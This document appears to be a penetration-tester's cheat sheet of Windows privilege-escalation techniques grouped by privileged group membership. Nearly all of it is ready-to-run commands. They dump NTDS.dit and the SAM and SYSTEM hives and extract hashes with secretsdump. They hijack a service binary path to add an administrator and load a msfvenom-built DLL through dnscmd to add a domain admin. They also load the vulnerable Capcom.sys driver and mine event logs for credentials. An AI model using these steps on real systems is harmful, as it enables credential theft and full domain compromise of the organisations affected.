# âœ… Windows Privilege Escalation â€“ Group Privileges (Cheat Sheet)

---

## ðŸŽ¯ Quick Wins
- [ ] `Backup Operators` â†’ Copy files (SAM, SYSTEM, NTDS.dit)
- [ ] `Server Operators` â†’ Modify service binary path â†’ SYSTEM/Admin
- [ ] `Print Operators` â†’ Load vulnerable driver (Capcom.sys) â†’ SYSTEM
- [ ] `DnsAdmins` â†’ Load malicious DLL via dnscmd â†’ DA / SYSTEM
- [ ] `Hyper-V Admins` â†’ Access VM disks â†’ NTDS.dit â†’ Hashes
- [ ] `Event Log Readers` â†’ Search logs for credentials

---

## âœ… Enumeration

```powershell
whoami /groups
net localgroup "Backup Operators"
net localgroup "DnsAdmins"
net localgroup "Event Log Readers"
```

## âœ… Backup Operators

```c
# Enable Backup Privilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Copy Protected File
Copy-FileSeBackupPrivilege 'C:\Confidential\file.txt' .\file.txt

# Copy NTDS.dit & SYSTEM hive (using diskshadow)
diskshadow.exe
DISKSHADOW> set context clientaccessible
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
robocopy /B E:\Windows\NTDS .\ntds ntds.dit


# Backup SAM & SYSTEM hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Extract Hashes
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```
## âœ… Server Operators

```c
# Check The current configuration of the service
> sc qc <service name>

# Modify Service Binary Path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators user /add"

# Start The Service
sc start AppReadiness || > net start daclsvc

# Verify Admin Access
net localgroup Administrators
```

## âœ… DnsAdmins

```c
#Check Permession
sc sdshow DNS

# Create Malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" user /add /domain' -f dll -o adduser.dll

# Load DLL with dnscmd
dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll

# Restart DNS Service (if allowed)
sc stop dns
sc start dns

# Cleanup
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

## âœ… Hyper-V Administrators

```c
# Exploit via VHDX access or vulnerable service (e.g., Mozilla Maintenance Service)
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Replace binary with malicious exe and start service
sc start MozillaMaintenance
```

## âœ… Event Log Readers

```c
# Confirm Group Membership
net localgroup "Event Log Readers"

# Search Logs for Credentials
wevtutil qe Security /rd:true /f:text | findstr "/user"
Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

## âœ… Print Operators

```c
# Confirm Privilege
whoami /priv

# Enable SeLoadDriverPrivilege
EnableSeLoadDriverPrivilege.exe

# Add reference to Capcom.sys driver
reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\Capcom /v Type /t REG_DWORD /d 1

# Exploit the driver
ExploitCapcom.exe
```
---
---
